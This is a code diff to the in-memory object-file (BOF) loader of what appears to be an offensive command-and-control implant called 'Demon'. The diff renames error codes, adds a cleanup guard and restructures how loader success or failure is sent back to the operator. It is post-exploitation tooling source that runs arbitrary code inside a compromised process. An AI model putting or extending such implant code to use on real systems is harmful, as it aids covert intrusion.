@@ -31,7 +31,7 @@ LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )
     Exception->ContextRecord->Rip = CoffeeFunctionReturn;
 
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
-    PackageAddInt32( Package, DEMON_EXCEPTION );
+    PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_EXCEPTION );
     PackageAddInt32( Package, Exception->ExceptionRecord->ExceptionCode );
     PackageAddInt64( Package, Exception->ExceptionRecord->ExceptionAddress );
     PackageTransmit( Package, NULL, NULL );
@@ -113,7 +113,7 @@ BOOL CoffeeProcessSymbol( LPSTR Symbol, PVOID* pFuncAddr )
 
 SymbolNotFound:
     Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
-    PackageAddInt32( Package, DEMON_SYMBOL_NOT_FOUND );
+    PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_SYMBOL_NOT_FOUND );
     PackageAddBytes( Package, Symbol, StringLengthA( Symbol ) );
     PackageTransmit( Package, NULL, NULL );
 
@@ -191,7 +191,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
 
         PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
 
-        PackageAddInt32( Package, DEMON_SYMBOL_NOT_FOUND );
+        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_SYMBOL_NOT_FOUND );
         PackageAddBytes( Package, Function, StringLengthA( Function ) );
         PackageTransmit( Package, NULL, NULL );
 
@@ -232,6 +232,9 @@ VOID CoffeeCleanup( PCOFFEE Coffee )
     PVOID    Pointer  = NULL;
     SIZE_T   Size     = 0;
     NTSTATUS NtStatus = 0;
+
+    if ( ! Coffee || ! Coffee->ImageBase )
+        return;
 
     if ( MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->ImageBase, Coffee->BofSize, PAGE_READWRITE ) )
         MemSet( Coffee->ImageBase, 0, Coffee->BofSize );
@@ -467,17 +470,18 @@ SIZE_T CoffeeGetFunMapSize( PCOFFEE Coffee )
     return sizeof( UINT64 ) * NumberOfFuncs;
 }
 
-DWORD CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize )
+VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize )
 {
     COFFEE Coffee   = { 0 };
     PVOID  NextBase = NULL;
+    BOOL   Success  = FALSE;
 
     PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData, ArgData, ArgSize )
 
     if ( ! CoffeeData )
     {
         PUTS( "[!] Coffee data is empty" );
-        return 1;
+        goto END;
     }
 
     /*
@@ -494,7 +498,7 @@ DWORD CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSiz
     if ( Coffee.Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
     {
         PUTS( "The BOF is not AMD64" );
-        return 1;
+        goto END;
     }
 
     Coffee.SecMap     = Instance.Win32.LocalAlloc( LPTR, Coffee.Header->NumberOfSections * sizeof( SECTION_MAP ) );
@@ -503,7 +507,7 @@ DWORD CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSiz
     if ( ! Coffee.SecMap )
     {
         PUTS( "Failed to allocate memory" )
-        return 1;
+        goto END;
     }
 
     // calculate the size of the entire BOF
@@ -521,7 +525,7 @@ DWORD CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSiz
     if ( ! Coffee.ImageBase )
     {
         PUTS( "Failed to allocate memory for the BOF" )
-        return 1;
+        goto END;
     }
 
     NextBase = Coffee.ImageBase;
@@ -545,30 +549,36 @@ DWORD CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSiz
     if ( ! CoffeeProcessSections( &Coffee ) )
     {
         PUTS( "[*] Failed to process relocation" );
-        return 1;
+        goto END;
     }
 
     PUTS( "[*] Execute coffee main\n" );
-    CoffeeExecuteFunction( &Coffee, EntryName, ArgData, ArgSize );
+    Success = CoffeeExecuteFunction( &Coffee, EntryName, ArgData, ArgSize );
 
+END:
     PUTS( "[*] Cleanup memory" );
     CoffeeCleanup( &Coffee );
 
-    return 0;
+    if ( Success )
+    {
+        PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
+        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_RAN_OK );
+        PackageTransmit( Package, NULL, NULL );
+    }
+    else
+    {
+        PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
+        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_COULD_NO_RUN );
+        PackageTransmit( Package, NULL, NULL );
+    }
 }
 
 VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )
 {
-    DWORD Status = 0;
-
     if ( ! Param->EntryName || ! Param->CoffeeData )
         goto ExitThread;
 
-    Status = CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize );
-    if ( Status )
-    {
-        PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
-    }
+    CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize );
 
 ExitThread:
     if ( Param->EntryName )
